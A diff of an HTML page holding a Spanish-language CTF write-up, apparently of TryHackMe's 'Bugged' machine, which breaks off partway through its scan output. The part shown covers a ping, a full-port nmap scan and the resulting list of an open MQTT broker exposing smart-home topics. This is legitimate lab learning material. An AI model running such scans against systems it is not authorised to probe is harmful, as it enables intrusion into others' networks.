@@ -1,19 +1,4 @@
-<!DOCTYPE html>
-<html lang="es">
-
-<head>
-  <title>
-  Bugged CTF · 0xjustgr0w
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
-
-
-
-
-<meta name="author" content="David León">
-<meta name="description" content="
+<!doctype html><html lang=es><head><title>Bugged CTF · 0xjustgr0w</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="David León"><meta name=description content="
   Máquina Bugged
   
     
@@ -37,645 +22,296 @@ PING 10.201.64.81 (10.201.64.81) 56(84) bytes of data.
 --- 10.201.64.81 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 228.641/228.641/228.641/0.000 ms
-Podemos determinar que es un S.O Linux a través del TTL(OJO: esto se puede modificar).">
-<meta name="keywords" content="blog,hacking,personal">
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Bugged CTF">
-  <meta name="twitter:description" content="Máquina BuggedLink to headingDificultad: Fácil
+Podemos determinar que es un S.O Linux a través del TTL(OJO: esto se puede modificar)."><meta name=keywords content="blog,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Bugged CTF"><meta name=twitter:description content="Máquina BuggedLink to headingDificultad: Fácil
 Descripción: John estaba trabajando en sus electrodomésticos inteligentes cuando notó tráfico extraño en la red. ¿Puedes ayudarle a descubrir qué son estas comunicaciones de red extrañas?
 EnumeraciónLink to headingComenzamos haciendo un ping a la máquina objetivo():
-PING 10.201.64.81 (10.201.64.81) 56(84) bytes of data. 64 bytes from 10.201.64.81: icmp_seq=1 ttl=61 time=229 ms --- 10.201.64.81 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 228.641/228.641/228.641/0.000 ms Podemos determinar que es un S.O Linux a través del TTL(OJO: esto se puede modificar).">
-
-<meta property="og:url" content="https://justgr0w.github.io/posts/bugged/">
-  <meta property="og:site_name" content="0xjustgr0w">
-  <meta property="og:title" content="Bugged CTF">
-  <meta property="og:description" content="Máquina BuggedLink to headingDificultad: Fácil
+PING 10.201.64.81 (10.201.64.81) 56(84) bytes of data. 64 bytes from 10.201.64.81: icmp_seq=1 ttl=61 time=229 ms --- 10.201.64.81 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 228.641/228.641/228.641/0.000 ms Podemos determinar que es un S.O Linux a través del TTL(OJO: esto se puede modificar)."><meta property="og:url" content="https://justgr0w.github.io/posts/bugged/"><meta property="og:site_name" content="0xjustgr0w"><meta property="og:title" content="Bugged CTF"><meta property="og:description" content="Máquina BuggedLink to headingDificultad: Fácil
 Descripción: John estaba trabajando en sus electrodomésticos inteligentes cuando notó tráfico extraño en la red. ¿Puedes ayudarle a descubrir qué son estas comunicaciones de red extrañas?
 EnumeraciónLink to headingComenzamos haciendo un ping a la máquina objetivo():
-PING 10.201.64.81 (10.201.64.81) 56(84) bytes of data. 64 bytes from 10.201.64.81: icmp_seq=1 ttl=61 time=229 ms --- 10.201.64.81 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 228.641/228.641/228.641/0.000 ms Podemos determinar que es un S.O Linux a través del TTL(OJO: esto se puede modificar).">
-  <meta property="og:locale" content="es">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-01T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-10-01T00:00:00+00:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="Easy">
-    <meta property="article:tag" content="TryHackMe">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/soupedecode01/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/billing/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/publisher/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/blueprint/">
-
-
-
-
-<link rel="canonical" href="https://justgr0w.github.io/posts/bugged/">
-
-
-<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css" integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin="anonymous" media="screen" />
-
-
-
-
-
-
-  
-    
-    
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
-  
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
-</head>
-
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="https://justgr0w.github.io/">
-      0xjustgr0w
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
-        
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/contact/">Sobre mí</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/posts/">Blog</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/projects/">Proyectos</a>
-            </li>
-          
-        
-        
-      </ul>
-    
-  </section>
-</nav>
-
-
-    <div class="content">
-      
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">
-            <a class="title-link" href="https://justgr0w.github.io/posts/bugged/">
-              Bugged CTF
-            </a>
-          </h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
-              <time datetime="2025-10-01T00:00:00Z">
-                octubre 1, 2025
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              6 minutos de lectura.
-            </span>
-          </div>
-          <div class="authors">
-  <i class="fa-solid fa-user" aria-hidden="true"></i>
-    <a href="/authors/0xjustgr0w/">0xjustgr0w</a></div>
-
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="/categories/pentesting/">Pentesting</a></div>
-
-          <div class="tags">
-  <i class="fa-solid fa-tag" aria-hidden="true"></i>
-    <span class="tag">
-      <a href="/tags/ctf/">CTF</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/easy/">Easy</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/tryhackme/">TryHackMe</a>
-    </span></div>
-
-        </div>
-      </header>
-
-      <div class="post-content">
-        
-        <h1 id="máquina-bugged">
-  Máquina Bugged
-  <a class="heading-link" href="#m%c3%a1quina-bugged">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h1>
-<p><img src="/images/posts/bugged/bugged.png" alt="target"></p>
-<p><strong>Dificultad</strong>: <em>Fácil</em></p>
-<p><strong>Descripción</strong>: John estaba trabajando en sus electrodomésticos inteligentes cuando notó tráfico extraño en la red. ¿Puedes ayudarle a descubrir qué son estas comunicaciones de red extrañas?</p>
-<h2 id="enumeración">
-  Enumeración
-  <a class="heading-link" href="#enumeraci%c3%b3n">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>Comenzamos haciendo un ping a la máquina objetivo():</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">PING</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">64</span><span class="o">.</span><span class="mi">81</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">64</span><span class="o">.</span><span class="mi">81</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">64</span><span class="o">.</span><span class="mi">81</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">61</span> <span class="n">time</span><span class="o">=</span><span class="mi">229</span> <span class="n">ms</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">64</span><span class="o">.</span><span class="mi">81</span> <span class="n">ping</span> <span class="n">statistics</span> <span class="o">---</span>
-</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">packets</span> <span class="n">transmitted</span><span class="p">,</span> <span class="mi">1</span> <span class="n">received</span><span class="p">,</span> <span class="mi">0</span><span class="o">%</span> <span class="n">packet</span> <span class="n">loss</span><span class="p">,</span> <span class="n">time</span> <span class="mi">0</span><span class="n">ms</span>
-</span></span><span class="line"><span class="cl"><span class="n">rtt</span> <span class="n">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="n">max</span><span class="o">/</span><span class="n">mdev</span> <span class="o">=</span> <span class="mi">228</span><span class="o">.</span><span class="mi">641</span><span class="o">/</span><span class="mi">228</span><span class="o">.</span><span class="mi">641</span><span class="o">/</span><span class="mi">228</span><span class="o">.</span><span class="mi">641</span><span class="o">/</span><span class="mi">0</span><span class="o">.</span><span class="mo">000</span> <span class="n">ms</span></span></span></code></pre></div>
-<p>Podemos determinar que es un S.O <code>Linux</code> a través del <strong>TTL</strong>(OJO: esto se puede modificar).</p>
-<p>Comenzamos enumerando servicios y puertos abiertos con <strong>nmap</strong>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -Pn -n 10.201.64.81 -sCV</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">95</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mo">01</span> <span class="mi">12</span><span class="p">:</span><span class="mi">32</span> <span class="no">EDT</span>
-</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">64</span><span class="o">.</span><span class="mi">81</span>
-</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">24</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">63962</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">1571</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="no">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="n">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
-</span></span><span class="line"><span class="cl"><span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>                  <span class="no">VERSION</span>
-</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>                      <span class="no">OpenSSH</span> <span class="mi">8</span><span class="o">.</span><span class="mi">2</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">13</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">3072</span> <span class="mi">9</span><span class="ss">c</span><span class="p">:</span><span class="ss">f5</span><span class="p">:</span><span class="mo">01</span><span class="ss">:b9</span><span class="p">:</span><span class="mo">00</span><span class="ss">:cd</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">4</span><span class="ss">f</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">6</span><span class="ss">d</span><span class="p">:</span><span class="ss">f2</span><span class="p">:</span><span class="ss">f9</span><span class="p">:</span><span class="n">d7</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">48</span><span class="ss">:ce</span><span class="p">:</span><span class="mi">2</span><span class="ss">d</span><span class="p">:</span><span class="mo">05</span><span class="p">:</span><span class="mi">5</span><span class="ss">a</span><span class="p">:</span><span class="mi">87</span><span class="ss">:c1:ec</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">97</span><span class="ss">:b4</span><span class="p">:</span><span class="mi">2</span><span class="ss">b</span><span class="p">:</span><span class="mi">6</span><span class="ss">b</span><span class="p">:</span><span class="ss">a8</span><span class="p">:</span><span class="n">bd</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">24</span><span class="ss">:d7</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">4</span><span class="ss">b</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">3</span><span class="ss">c</span><span class="p">:</span><span class="ss">c8</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">5</span><span class="ss">c</span><span class="p">:</span><span class="mi">5</span><span class="ss">e</span><span class="p">:</span><span class="ss">d8</span><span class="p">:</span><span class="mi">6</span><span class="ss">d</span><span class="p">:</span><span class="ss">fa</span><span class="p">:</span><span class="ss">c7</span><span class="p">:</span><span class="mi">42</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="mi">1883</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mosquitto</span> <span class="n">version</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">14</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">mqtt</span><span class="o">-</span><span class="ss">subscribe</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="no">Topics</span> <span class="ow">and</span> <span class="n">their</span> <span class="n">most</span> <span class="n">recent</span> <span class="ss">payloads</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="n">received</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">87</span><span class="o">.</span><span class="mi">61</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">publish</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="ss">sent</span><span class="p">:</span> <span class="mi">432</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">publish</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="ss">sent</span><span class="p">:</span> <span class="mi">56</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="ss">received</span><span class="p">:</span> <span class="mi">75711</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="ss">stored</span><span class="p">:</span> <span class="mi">33</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">storage</span><span class="o">/</span><span class="ss">thermostat</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">16286150324772256139</span><span class="p">,</span><span class="s2">&#34;temperature&#34;</span><span class="p">:</span><span class="mi">24</span><span class="o">.</span><span class="mi">199913</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">connections</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">40</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">64</span><span class="o">.</span><span class="mi">26</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">93</span><span class="o">.</span><span class="mi">11</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">publish</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">25</span><span class="o">.</span><span class="mi">58</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">1473</span><span class="o">.</span><span class="mi">09</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">publish</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">5</span><span class="o">.</span><span class="mi">50</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">sockets</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">40</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="n">received</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">4127</span><span class="o">.</span><span class="mi">55</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="n">received</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">62</span><span class="o">.</span><span class="mi">40</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">patio</span><span class="o">/</span><span class="ss">lights</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">10091236782170931182</span><span class="p">,</span><span class="s2">&#34;color&#34;</span><span class="ss">:&#34;WHITE&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="ss">:&#34;ON&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">sockets</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">1</span><span class="o">.</span><span class="mi">83</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="ss">received</span><span class="p">:</span> <span class="mi">1593</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="ss">uptime</span><span class="p">:</span> <span class="mi">1056</span> <span class="n">seconds</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="n">received</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">4244</span><span class="o">.</span><span class="mi">34</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">sockets</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">15</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">livingroom</span><span class="o">/</span><span class="ss">speaker</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="mi">15784822528549805117</span><span class="p">,</span><span class="s2">&#34;gain&#34;</span><span class="p">:</span><span class="mi">41</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="ss">version</span><span class="p">:</span> <span class="n">mosquitto</span> <span class="n">version</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">14</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">clients</span><span class="o">/</span><span class="ss">active</span><span class="p">:</span> <span class="mi">2</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">store</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="ss">count</span><span class="p">:</span> <span class="mi">33</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">publish</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="ss">received</span><span class="p">:</span> <span class="mi">54039</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">retained</span> <span class="n">messages</span><span class="o">/</span><span class="ss">count</span><span class="p">:</span> <span class="mi">36</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">subscriptions</span><span class="o">/</span><span class="ss">count</span><span class="p">:</span> <span class="mi">3</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">connections</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">1</span><span class="o">.</span><span class="mi">83</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">store</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="ss">bytes</span><span class="p">:</span> <span class="mi">177</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">clients</span><span class="o">/</span><span class="ss">maximum</span><span class="p">:</span> <span class="mi">2</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">clients</span><span class="o">/</span><span class="ss">connected</span><span class="p">:</span> <span class="mi">2</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="ss">sent</span><span class="p">:</span> <span class="mi">8829</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="n">received</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">91</span><span class="o">.</span><span class="mi">43</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">1</span><span class="ss">min</span><span class="p">:</span> <span class="mi">117</span><span class="o">.</span><span class="mo">01</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">publish</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">1</span><span class="o">.</span><span class="mi">86</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="n">messages</span><span class="o">/</span><span class="ss">sent</span><span class="p">:</span> <span class="mi">1648</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">5</span><span class="ss">min</span><span class="p">:</span> <span class="mi">588</span><span class="o">.</span><span class="mi">47</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="vg">$SYS</span><span class="o">/</span><span class="n">broker</span><span class="o">/</span><span class="nb">load</span><span class="o">/</span><span class="n">bytes</span><span class="o">/</span><span class="n">sent</span><span class="o">/</span><span class="mi">15</span><span class="ss">min</span><span class="p">:</span> <span class="mi">329</span><span class="o">.</span><span class="mi">94</span>
